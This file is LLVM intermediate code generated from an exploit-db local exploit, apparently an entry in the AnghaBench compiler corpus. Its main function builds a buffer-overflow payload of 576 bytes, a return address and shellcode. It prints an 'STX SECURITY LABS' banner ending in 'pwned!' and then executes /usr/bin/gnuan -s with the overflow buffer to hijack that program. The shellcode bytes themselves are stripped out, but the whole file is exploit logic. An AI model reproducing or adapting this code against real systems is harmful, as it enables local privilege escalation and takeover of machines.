; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22861.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22861.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stxcode = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"#####################################\0A\00", align 1
@.str.2 = private unnamed_addr constant [39 x i8] c"#        [ STX SECURITY LABS ]      #\0A\00", align 1
@.str.3 = private unnamed_addr constant [39 x i8] c"#  gnuan local poc exploit by: ace  #\0A\00", align 1
@.str.4 = private unnamed_addr constant [40 x i8] c"#####################################\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [26 x i8] c"[+] Return Address: 0x%x\0A\00", align 1
@.str.6 = private unnamed_addr constant [21 x i8] c"[+] Buffer Size: %d\0A\00", align 1
@.str.7 = private unnamed_addr constant [31 x i8] c"[-] /usr/bin/gnuan -s pwned!\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [15 x i8] c"/usr/bin/gnuan\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"gnuan\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"-s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i8* (...) @pen0r()
  %13 = ptrtoint i8* %12 to i32
  store i32 %13, i32* %7, align 4
  store i32 144, i32* %8, align 4
  store i32 576, i32* %9, align 4
  %14 = load i32, i32* %9, align 4
  %15 = add nsw i32 %14, 4
  store i32 %15, i32* %10, align 4
  %16 = load i32, i32* %9, align 4
  %17 = call i64 @malloc(i32 %16)
  %18 = inttoptr i64 %17 to i8*
  store i8* %18, i8** %11, align 8
  store i32 0, i32* %6, align 4
  br label %19

19:                                               ; preds = %31, %2
  %20 = load i32, i32* %6, align 4
  %21 = load i32, i32* %9, align 4
  %22 = icmp slt i32 %20, %21
  br i1 %22, label %23, label %34

23:                                               ; preds = %19
  %24 = load i32, i32* %8, align 4
  %25 = sext i32 %24 to i64
  %26 = load i8*, i8** %11, align 8
  %27 = load i32, i32* %6, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = bitcast i8* %29 to i64*
  store i64 %25, i64* %30, align 8
  br label %31

31:                                               ; preds = %23
  %32 = load i32, i32* %6, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %6, align 4
  br label %19

34:                                               ; preds = %19
  %35 = call i8* (...) @pen0r()
  %36 = ptrtoint i8* %35 to i64
  %37 = load i8*, i8** %11, align 8
  %38 = load i32, i32* %9, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  %41 = bitcast i8* %40 to i64*
  store i64 %36, i64* %41, align 8
  %42 = load i8*, i8** %11, align 8
  %43 = load i32, i32* %9, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i32, i32* @stxcode, align 4
  %47 = call i32 @strlen(i32 %46)
  %48 = sext i32 %47 to i64
  %49 = sub i64 0, %48
  %50 = getelementptr inbounds i8, i8* %45, i64 %49
  %51 = load i32, i32* @stxcode, align 4
  %52 = load i32, i32* @stxcode, align 4
  %53 = call i32 @strlen(i32 %52)
  %54 = call i32 @memcpy(i8* %50, i32 %51, i32 %53)
  %55 = call i32 @system(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.2, i64 0, i64 0))
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.3, i64 0, i64 0))
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.4, i64 0, i64 0))
  %60 = load i32, i32* %7, align 4
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0), i32 %60)
  %62 = load i32, i32* %10, align 4
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0), i32 %62)
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.7, i64 0, i64 0))
  %65 = load i8*, i8** %11, align 8
  %66 = call i32 @execl(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i8* %65, i32* null)
  ret i32 0
}

declare dso_local i8* @pen0r(...) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
